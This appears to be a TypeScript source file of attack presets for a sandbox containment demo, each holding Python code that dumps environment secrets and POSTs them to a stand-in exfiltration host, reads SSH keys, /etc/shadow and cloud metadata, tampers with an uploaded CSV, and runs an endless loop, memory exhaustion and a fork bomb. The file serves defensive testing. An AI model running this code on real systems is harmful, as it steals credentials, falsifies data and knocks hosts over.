import type { SandboxStatus } from "./types";

export interface AttackPreset {
  id: string;
  label: string;
  threat: string;
  expect: string;
  /** Which outcome proves containment held. */
  containedWhen: (status: SandboxStatus, log: string) => boolean;
  code: string;
}

const has = (log: string, ...needles: string[]): boolean => needles.some((n) => log.includes(n));

export const ATTACK_PRESETS: AttackPreset[] = [
  {
    id: "exfiltrate",
    label: "Steal secrets and phone home",
    threat: "Prompt-injected code dumps the environment and POSTs it to an attacker.",
    expect: "The environment holds no keys, and the request fails: there is no network at all.",
    containedWhen: (_s, log) => has(log, "NETWORK BLOCKED") && has(log, "secrets found: none"),
    code: `import os, json, urllib.request

env = dict(os.environ)
print("environment variables:", sorted(env))
leaked = {k: v for k, v in env.items() if "KEY" in k or "TOKEN" in k or "SECRET" in k}
print("secrets found:", leaked or "none")

try:
    req = urllib.request.Request("http://collect.exfil-demo.net/drop",
                                 data=json.dumps(env).encode(), method="POST")
    urllib.request.urlopen(req, timeout=5)
    print("EXFILTRATED")
except Exception as e:
    print("NETWORK BLOCKED:", type(e).__name__, e)
`,
  },
  {
    id: "host",
    label: "Read the host's files",
    threat: "Code tries to read SSH keys, the cloud metadata service and the host's passwords.",
    expect: "gVisor shows a separate, empty kernel and filesystem; nothing from the host exists.",
    containedWhen: (s, log) => s === "ok" && !has(log, "BEGIN OPENSSH", "LEAKED"),
    code: `import os, socket

for path in ["/root/.ssh/id_ed25519", "/home/linuxuser/.ssh", "/etc/shadow", "/opt/prereg/.env"]:
    try:
        data = open(path).read() if os.path.isfile(path) else os.listdir(path)
        print("LEAKED", path, str(data)[:80])
    except Exception as e:
        print("blocked", path, "->", type(e).__name__)

pid1_env = open("/proc/1/environ").read().split("\\0")
print("PID 1 environment inside the sandbox:", [v.split("=")[0] for v in pid1_env if v])
print("kernel seen from inside:", os.uname().release)
try:
    socket.create_connection(("169.254.169.254", 80), timeout=3)
    print("LEAKED cloud metadata reachable")
except OSError as e:
    print("blocked cloud metadata ->", type(e).__name__)
`,
  },
  {
    id: "tamper",
    label: "Tamper with the data",
    threat: "Code rewrites the uploaded CSV so the numbers come out the way it wants.",
    expect: "The data is mounted read-only. The write fails and the original stays intact.",
    containedWhen: (_s, log) => has(log, "WRITE BLOCKED"),
    code: `try:
    with open("/data/input.csv", "a") as fh:
        fh.write("999999,fabricated\\n")
    print("TAMPERED")
except OSError as e:
    print("WRITE BLOCKED:", e)

try:
    open("/usr/local/bin/python-backdoor", "w").write("x")
    print("TAMPERED system")
except OSError as e:
    print("WRITE BLOCKED (system):", e)
`,
  },
  {
    id: "loop",
    label: "Run forever",
    threat: "A buggy or malicious loop never ends and holds a CPU hostage.",
    expect: "The run is killed at the 30-second limit and the container is destroyed.",
    containedWhen: (s) => s === "timeout",
    code: `import time
print("starting an infinite loop at", time.strftime("%H:%M:%S"))
n = 0
while True:
    n += 1
    if n % 20_000_000 == 0:
        print("still spinning...", n)
`,
  },
  {
    id: "memory",
    label: "Eat all the memory",
    threat: "Code allocates memory until the machine falls over.",
    expect: "It hits the 512 MB cap and is killed; the host never notices.",
    containedWhen: (s, log) => s === "killed" || has(log, "MemoryError"),
    code: `blocks = []
for i in range(1, 100):
    blocks.append(bytearray(64 * 1024 * 1024))
    print(f"allocated {i * 64} MB")
`,
  },
  {
    id: "forkbomb",
    label: "Fork bomb",
    threat: "Code spawns processes exponentially to exhaust the host.",
    expect: "It hits the 128-process cap and the sandbox ends the run in under a second; the host never notices.",
    containedWhen: (s, log) => !has(log, "FORK BOMB SUCCEEDED") && (s !== "ok" || has(log, "FORK BLOCKED")),
    code: `import os, sys
children = 0
try:
    for _ in range(1000):
        pid = os.fork()
        if pid == 0:
            import time; time.sleep(20); os._exit(0)
        children += 1
    print("FORK BOMB SUCCEEDED", children)
except OSError as e:
    print(f"FORK BLOCKED after {children} processes:", e)
    sys.exit(0)
`,
  },
];
